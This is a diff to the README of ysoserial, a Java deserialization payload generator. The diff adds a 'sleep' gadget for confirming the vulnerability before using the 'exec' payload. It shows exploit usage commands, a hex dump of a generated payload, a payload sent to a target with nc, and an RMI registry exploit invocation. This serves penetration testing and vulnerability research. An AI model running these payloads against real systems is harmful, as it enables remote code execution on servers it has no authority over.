@@ -18,6 +18,11 @@ this data, the chain will automatically be invoked and cause the command to be e
 It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
 gadgets on the classpath.
 
+This version edited by Federico Dotta add the possibility to generate a gadget that lead to the java.lang.Thread.sleep function in addction
+to the java.lang.Runtime.exec one. The sleep function can be easly used to verify the presence of the vulnerability, before using the 
+exec payload to exploit it. It is usefull to have an easy way to detect the presence of the issue because the exec command don't return any output
+and in some cirumstances can be very hard to understand if the injected command has been executed.
+
 ## Disclaimer
 
 This software has been created purely for the purposes of academic research and
@@ -30,18 +35,21 @@ are not responsible or liable for misuse of the software. Use responsibly.
 ```shell
 $ java -jar ysoserial-0.0.1-all.jar
 Y SO SERIAL?
-Usage: java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]'
+Usage: java -jar ysoserial-[version]-all.jar [payload type] [payload function] '[command to execute]'
         Available payload types:
                 CommonsCollections1
                 CommonsCollections2
                 Groovy1
-                Spring1           
+                Spring1   
+        Available payload functions:
+                exec
+                sleep        
 ```
 
 ## Examples
 
 ```shell
-$ java -jar ysoserial-0.0.1-all.jar CommonsCollections1 calc.exe | xxd
+$ java -jar ysoserial-0.0.1-all.jar CommonsCollections1 exec calc.exe | xxd
 0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
 0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
 0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
@@ -50,7 +58,7 @@ $ java -jar ysoserial-0.0.1-all.jar CommonsCollections1 calc.exe | xxd
 0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
 0000570: 0078 7071 007e 003a                      .xpq.~.:
        
-$ java -jar ysoserial-0.0.1-all.jar Groovy1 calc.exe > groovypayload.bin
+$ java -jar ysoserial-0.0.1-all.jar Groovy1 exec calc.exe > groovypayload.bin
 $ nc 10.10.10.10 < groovypayload.bin
 
 $ java -cp ysoserial-0.0.1-all.jar ysoserial.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
